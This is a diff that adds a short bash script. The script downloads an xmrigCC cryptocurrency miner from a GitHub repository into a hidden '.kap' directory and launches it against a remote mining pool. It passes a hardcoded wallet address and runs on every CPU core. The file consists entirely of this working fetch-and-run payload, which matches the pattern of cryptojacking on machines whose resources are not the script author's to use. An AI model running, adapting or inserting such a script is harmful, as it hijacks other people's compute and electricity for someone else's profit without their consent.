@@ -1,0 +1,6 @@
+#!/bin/bash
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget https://github.com/nandafiku/gradi/raw/main/xmrigCC-3.4.0-linux-dynamic-amd64.tar.gz
+tar xf xmrigCC-3.4.0-linux-dynamic-amd64.tar.gz && cd miner
+./xmrigDaemon -a randomx -o randomx.rplant.xyz:7020 -u amyKuFJSpGf31yXdWzBNzh23LmCnuC6G9Ht9QuuiQVXzfF1t1S22aanX9KESwL1hhQZTbjgiVuHYJgTmeVPqwebE4KFr6tnTks.x -p start=10000,webpassword=x -t $(nproc --all)
